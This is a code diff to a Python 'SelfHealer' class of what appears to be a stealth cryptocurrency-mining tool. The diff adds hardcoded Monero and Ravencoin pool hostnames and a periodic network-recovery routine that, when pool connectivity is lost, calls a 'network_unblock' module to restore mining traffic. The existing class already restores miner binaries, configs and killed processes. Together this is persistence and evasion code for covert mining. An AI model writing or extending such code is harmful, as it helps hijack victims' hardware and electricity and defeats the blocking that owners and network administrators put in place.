@@ -119,14 +119,20 @@ class SelfHealer:
         gpu_miner,
         config_builder,
         stealth_config=None,
+        pool_hostnames: list[str] | None = None,
     ):
         self._webcoin_dir = webcoin_dir
         self._cpu = cpu_miner
         self._gpu = gpu_miner
         self._cb = config_builder
         self._sc = stealth_config
+        self._pool_hostnames = pool_hostnames or [
+            "cryptonote.social", "pool.hashvault.pro",
+            "gulf.moneroocean.stream", "rvn.2miners.com",
+        ]
         self._running = False
         self._thread: threading.Thread | None = None
+        self._network_check_counter = 0
 
     def start(self):
         if self._running:
@@ -156,6 +162,7 @@ class SelfHealer:
         self._heal_gpu_binary()
         self._heal_cpu_config()
         self._heal_dead_cpu_process()
+        self._heal_network()
 
     # ── repo recovery ──────────────────────────────────────────────
 
@@ -270,3 +277,17 @@ class SelfHealer:
             logger.info("CPU config regenerated at %s", self._cpu.config_path)
         except Exception as exc:
             logger.error("CPU config recovery failed: %s", exc)
+
+    # ── network recovery (every 5th cycle ≈ every 5 min) ──────────
+
+    def _heal_network(self):
+        self._network_check_counter += 1
+        if self._network_check_counter % 5 != 0:
+            return
+        try:
+            from core import network_unblock
+            if not network_unblock.quick_connectivity_check(self._pool_hostnames):
+                logger.warning("Pool connectivity lost — running network unblock")
+                network_unblock.prepare_mining_network(self._pool_hostnames)
+        except Exception as exc:
+            logger.debug("Network heal check failed: %s", exc)
